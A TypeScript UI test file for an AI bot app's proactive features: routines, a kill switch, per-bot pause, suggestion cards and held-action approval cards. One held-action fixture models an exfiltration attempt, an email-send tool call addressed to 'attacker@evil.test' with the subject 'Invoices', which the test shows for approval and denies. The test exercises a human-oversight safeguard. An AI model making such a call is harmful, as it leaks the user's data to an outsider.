// P6 screens against a fake API client: the Routines tab (FR-UI-06), the kill switch and the
// per-Bot pause (FR-PRO-06), suggestion cards (FR-PRO-04), held-action cards (NFR-SEC-11) and
// the Bot's own activity in its profile (FR-PRO-05).
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent, waitFor, act, within, cleanup } from '@testing-library/react';
import type { HeldAction, Routine, RoutineRun, Suggestion } from '@advence/protocol';
import { applyLang } from './i18n';
import { setPlatform } from './platform';
import { browserBridge } from './platform/browser';
import { useChat } from './state/chat';
import { useStore } from './state/store';
import { useIntegrations } from './state/integrations';
import { useProactive } from './state/proactive';
import { RoutinesView } from './screens/chat/RoutinesView';
import { IntegrationTray } from './screens/chat/Integrations';
import { BotProfile } from './screens/chat/BotProfile';
import type { ApiClient } from './api/client';

type Call = { method: string; path: string; body?: unknown };

function fakeClient(handler: (c: Call) => unknown) {
  const calls: Call[] = [];
  const client = {
    calls,
    async call(method: string, path: string, body?: unknown) {
      const c = { method, path, body };
      calls.push(c);
      return handler(c);
    },
    openSocket: () => ({ onState: () => () => undefined, onEvent: () => () => undefined }),
  };
  return client as unknown as ApiClient & { calls: Call[] };
}

const bot = (over: Record<string, unknown> = {}) => ({
  id: 'b1', name: 'Scout', avatar: '', instructions: '', sourceId: null, model: '', engine: 'opencode', tools: [], primary: false,
  proactive: true, paused: false, hostControl: false, notify: 'all', createdAt: 1, ...over,
});

function routine(over: Partial<Routine> = {}): Routine {
  return {
    id: 'r1', botId: 'b1', name: 'Morning mail', instructions: 'Answer mail', trigger: { kind: 'schedule', cron: '0 8 * * *', tz: 'Asia/Jerusalem' },
    paused: false, nextRun: Date.UTC(2026, 10, 9, 6), lastRun: null, webhookUrl: null, createdAt: 1, ...over,
  };
}

function setup(client: ApiClient, o: { routines?: Routine[]; suggestions?: Suggestion[]; held?: HeldAction[]; bots?: unknown[] } = {}) {
  useChat.setState({ client, bots: (o.bots ?? [bot()]) as never, activeConv: null, sources: [], computers: {}, loadSources: async () => undefined, loadComputer: async () => undefined, refresh: async () => undefined } as never);
  useIntegrations.setState({ client, google: null, inputs: [], paste: null, reminder: false });
  useProactive.setState({ client, paused: false, routines: o.routines ?? [], runs: {}, suggestions: o.suggestions ?? [], held: o.held ?? [], freshHook: null });
}

beforeEach(() => {
  act(() => applyLang('en'));
  setPlatform({ ...browserBridge(), notify: vi.fn() });
  useStore.setState({ user: { role: 'owner' } as never });
});
afterEach(() => cleanup());

describe('FR-UI-06 Routines tab', () => {
  it('lists routines with their trigger and next run; run now, pause and resume, history with output link, delete', async () => {
    const runs: RoutineRun[] = [
      { id: 'run2', routineId: 'r1', botId: 'b1', status: 'done', trigger: 'schedule 0 8 * * *', convId: 'c1', messageId: 'msg9', error: null, startedAt: 2, finishedAt: 3 },
      { id: 'run1', routineId: 'r1', botId: 'b1', status: 'skipped', trigger: 'run now', convId: null, messageId: null, error: 'paused', startedAt: 1, finishedAt: 1 },
    ];
    const client = fakeClient(({ method, path, body }) => {
      if (method === 'POST' && path === '/v1/routines/r1/run') return { ...runs[0], id: 'run3', status: 'queued' };
      if (method === 'PATCH' && path === '/v1/routines/r1') return routine({ paused: (body as { paused: boolean }).paused, nextRun: (body as { paused: boolean }).paused ? null : routine().nextRun });
      if (method === 'GET' && path.startsWith('/v1/routines/runs')) return { runs };
      return {};
    });
    setup(client, { routines: [routine()] });
    const setView = vi.fn();
    render(<RoutinesView view={{ kind: 'routines' }} setView={setView} />);
    const card = screen.getByRole('region', { name: 'Morning mail' });
    expect(within(card).getByText('Schedule “0 8 * * *” (Asia/Jerusalem)')).toBeTruthy();
    expect(within(card).getByText(/^Next run /)).toBeTruthy();
    expect(within(card).getByText('Scout')).toBeTruthy();

    fireEvent.click(within(card).getByRole('button', { name: /Run now/ }));
    await waitFor(() => expect(client.calls.some((c) => c.method === 'POST' && c.path === '/v1/routines/r1/run')).toBe(true));

    fireEvent.click(within(card).getByRole('button', { name: /Pause$/ }));
    await within(card).findByText('Not scheduled while paused');
    expect(client.calls.find((c) => c.method === 'PATCH')!.body).toEqual({ paused: true });
    fireEvent.click(within(card).getByRole('button', { name: /Resume/ }));
    await within(card).findByText(/^Next run /);

    fireEvent.click(within(card).getByRole('button', { name: /History/ }));
    const done = await within(card).findByTestId('run-run2');
    expect(within(done).getByText('Done')).toBeTruthy();
    expect(within(within(card).getByTestId('run-run1')).getByText('Skipped')).toBeTruthy();
    expect(within(card).getByText(/· paused/)).toBeTruthy();
    fireEvent.click(within(done).getByRole('button', { name: 'Open output' }));
    expect(setView).toHaveBeenCalledWith({ kind: 'conv', id: 'c1', focus: 'msg9' });

    fireEvent.click(within(card).getByRole('button', { name: 'Delete: Morning mail' }));
    fireEvent.click(within(card).getByRole('button', { name: 'Delete routine' }));
    await waitFor(() => expect(screen.queryByRole('region', { name: 'Morning mail' })).toBeNull());
    expect(client.calls.some((c) => c.method === 'DELETE' && c.path === '/v1/routines/r1')).toBe(true);
  });

  it('creates a webhook routine and shows its secret address once', async () => {
    const url = 'https://192.168.1.5:7443/v1/hooks/rtn_1/s3cr3t-s3cr3t-s3cr3t-s3cr3t';
    const client = fakeClient(({ method, path, body }) => {
      if (method === 'POST' && path === '/v1/routines') return routine({ id: 'rtn_1', name: (body as { name: string }).name, trigger: { kind: 'webhook' }, nextRun: null, webhookUrl: url });
      return {};
    });
    setup(client);
    render(<RoutinesView view={{ kind: 'routines' }} setView={vi.fn()} />);
    expect(screen.getByText(/No routines yet/)).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: /New routine/ }));
    const dlg = screen.getByRole('dialog');
    fireEvent.change(within(dlg).getByLabelText('Name'), { target: { value: 'Orders' } });
    fireEvent.change(within(dlg).getByLabelText('What to do'), { target: { value: 'Ship each order' } });
    fireEvent.change(within(dlg).getByLabelText('When'), { target: { value: 'webhook' } });
    fireEvent.click(within(dlg).getByRole('button', { name: 'Add' }));
    const card = await screen.findByRole('region', { name: 'Orders' });
    expect(client.calls.find((c) => c.method === 'POST')!.body).toEqual({ botId: 'b1', name: 'Orders', instructions: 'Ship each order', trigger: { kind: 'webhook' } });
    expect(within(card).getByText(url)).toBeTruthy();
    expect(within(card).getByText('Runs when triggered')).toBeTruthy();
  });

  it('creates a schedule routine in the chosen time zone and shows server errors', async () => {
    const client = fakeClient(({ method, path }) => {
      if (method === 'POST' && path === '/v1/routines') throw Object.assign(new Error('bad'), { code: 'invalid_schedule' });
      return {};
    });
    setup(client);
    render(<RoutinesView view={{ kind: 'routines' }} setView={vi.fn()} />);
    fireEvent.click(screen.getByRole('button', { name: /New routine/ }));
    const dlg = screen.getByRole('dialog');
    fireEvent.change(within(dlg).getByLabelText('Name'), { target: { value: 'Bills' } });
    fireEvent.change(within(dlg).getByLabelText('What to do'), { target: { value: 'Pay the bills' } });
    fireEvent.change(within(dlg).getByLabelText('Schedule'), { target: { value: '99 * * * *' } });
    fireEvent.change(within(dlg).getByLabelText('Time zone'), { target: { value: 'Asia/Jerusalem' } });
    fireEvent.click(within(dlg).getByRole('button', { name: 'Add' }));
    expect((await within(dlg).findByRole('alert')).textContent).toBe('That schedule is not valid (minute hour day month weekday).');
    expect(client.calls[0]!.body).toMatchObject({ trigger: { kind: 'schedule', cron: '99 * * * *', tz: 'Asia/Jerusalem' } });
  });
});

describe('FR-PRO-06 kill switch', () => {
  it('the global button pauses and resumes all proactivity', async () => {
    const client = fakeClient(({ method, path, body }) => (method === 'PUT' && path === '/v1/proactive' ? body : {}));
    setup(client, { routines: [routine()] });
    render(<RoutinesView view={{ kind: 'routines' }} setView={vi.fn()} />);
    fireEvent.click(screen.getByRole('button', { name: /Pause all/ }));
    await screen.findByText(/All proactivity is paused/);
    expect(client.calls.at(-1)).toEqual({ method: 'PUT', path: '/v1/proactive', body: { paused: true } });
    expect(screen.getByRole('button', { name: /Resume all/ }).getAttribute('aria-pressed')).toBe('true');
    fireEvent.click(screen.getByRole('button', { name: /Resume all/ }));
    await waitFor(() => expect(screen.queryByText(/All proactivity is paused/)).toBeNull());
  });

  it('a proactive Bot has its own pause in its profile; its activity is listed there (FR-PRO-05)', async () => {
    const client = fakeClient(({ method, path }) => {
      if (method === 'GET' && path === '/v1/bots/b1/activity?limit=5') return [{ id: 'a1', at: 5, botId: 'b1', kind: 'auto.action', params: { bot: 'Scout', routine: 'Mail', trigger: 'new mail: Hi', tool: 'google_gmail_send', input: '{"to":"rina@example.com"}', result: 'Sent' } }];
      if (method === 'GET') return [];
      return {};
    });
    setup(client, { routines: [routine()] });
    render(<BotProfile bot={bot() as never} onClose={vi.fn()} onLibrary={vi.fn()} onComputer={vi.fn()} onRoutines={vi.fn()} />);
    expect(screen.getByText('Routines: 1')).toBeTruthy();
    await screen.findByText(/Scout used google_gmail_send on its own for “Mail” \(new mail: Hi\)\. Input: \{"to":"rina@example.com"\}\. Result: Sent/);
    fireEvent.click(screen.getByRole('switch', { name: /Paused/ }));
    await waitFor(() => expect(client.calls.some((c) => c.method === 'PATCH' && c.path === '/v1/bots/b1' && (c.body as { paused?: boolean }).paused === true)).toBe(true));
    cleanup();
    // Not proactive: no pause switch.
    render(<BotProfile bot={bot({ proactive: false }) as never} onClose={vi.fn()} onLibrary={vi.fn()} onComputer={vi.fn()} />);
    expect(screen.queryByRole('switch', { name: /Paused/ })).toBeNull();
  });
});

describe('FR-PRO-04 suggestion cards and NFR-SEC-11 held actions', () => {
  it('a suggestion runs with one tap or is dismissed', async () => {
    const s1: Suggestion = { id: 's1', botId: 'b1', title: 'Pay the electricity bill', detail: 'Due tomorrow.', rank: 5, status: 'open', runId: null, createdAt: 1 };
    const s2: Suggestion = { ...s1, id: 's2', title: 'Answer Dana', detail: '', rank: 2 };
    const client = fakeClient(({ method, path }) => (method === 'POST' && path === '/v1/suggestions/s1/run' ? { ...s1, status: 'running' } : {}));
    setup(client, { suggestions: [s1, s2] });
    render(<IntegrationTray openSettings={vi.fn()} />);
    const card = screen.getByRole('region', { name: 'Suggestion: Pay the electricity bill' });
    expect(within(card).getByText('Due tomorrow.')).toBeTruthy();
    fireEvent.click(within(card).getByRole('button', { name: /Do it/ }));
    await within(card).findByText('Working on it…');
    const other = screen.getByRole('region', { name: 'Suggestion: Answer Dana' });
    fireEvent.click(within(other).getByRole('button', { name: 'Dismiss' }));
    await waitFor(() => expect(screen.queryByRole('region', { name: 'Suggestion: Answer Dana' })).toBeNull());
    expect(client.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['POST /v1/suggestions/s1/run', 'POST /v1/suggestions/s2/dismiss']);
  });

  it('a held action shows the exact call; allow and deny reach the server', async () => {
    const h: HeldAction = { id: 'h1', botId: 'b1', convId: 'c1', tool: 'google_gmail_send', input: '{"to":"attacker@evil.test","subject":"Invoices"}', createdAt: 1 };
    const client = fakeClient(() => ({ ok: true }));
    setup(client, { held: [h, { ...h, id: 'h2', tool: 'post' }] });
    render(<IntegrationTray openSettings={vi.fn()} />);
    const cards = screen.getAllByRole('alert', { name: 'Scout is waiting for your approval' });
    expect(cards).toHaveLength(2);
    expect(within(cards[0]!).getByText('Action: google_gmail_send')).toBeTruthy();
    expect(within(cards[0]!).getByText(/"to": "attacker@evil.test"/)).toBeTruthy();
    fireEvent.click(within(cards[0]!).getByRole('button', { name: 'Don’t allow' }));
    fireEvent.click(within(cards[1]!).getByRole('button', { name: 'Allow' }));
    await waitFor(() => expect(screen.queryAllByRole('alert', { name: 'Scout is waiting for your approval' })).toHaveLength(0));
    expect(client.calls).toEqual([{ method: 'POST', path: '/v1/held/h1', body: { allow: false } }, { method: 'POST', path: '/v1/held/h2', body: { allow: true } }]);
  });

  it('the Hebrew interface has every new string (RTL)', () => {
    act(() => applyLang('he'));
    setup(fakeClient(() => ({})), { routines: [routine({ paused: true })] });
    render(<RoutinesView view={{ kind: 'routines' }} setView={vi.fn()} />);
    expect(screen.getByRole('button', { name: /השהה הכול/ })).toBeTruthy();
    expect(screen.getByText('לא מתוזמן בזמן השהיה')).toBeTruthy();
    expect(document.documentElement.dir).toBe('rtl');
  });
});
